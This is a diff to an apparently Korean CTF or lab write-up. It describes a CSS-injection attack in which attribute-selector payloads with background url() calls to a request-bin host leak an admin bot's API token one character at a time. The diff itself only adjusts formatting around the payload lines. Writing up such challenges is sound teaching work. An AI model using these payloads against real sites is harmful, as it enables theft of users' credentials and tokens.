@@ -317,7 +317,8 @@ input 태그에 id, value, type 등 여러 속성들이 있는데 여러 개를 
 report 페이지로 가면 localhost가 admin 계정으로 로그인 한 뒤 url에 접속한다. 
 
 우리는 path에 ```mypage?color=red;} input[id=InputUsername][value^=a] {background: url(request bin url);```를 입력해주면 요청이 온 걸 알 수 있다.
-: 코드를 보면 admin의 username은 administrator이므로 선택된다.
+
+코드를 보면 admin의 username은 administrator이므로 선택된다.
 
 이 점을 이용하여 ```mypage?color=red;} input[id=InputApitoken][value^={token}] {background: url();```를 보내면서 admin의 token 값을 한자리 씩 알아낼 수 있다. 중간에 세션이 끊기면 처음부터 다시 구해야한다;
 
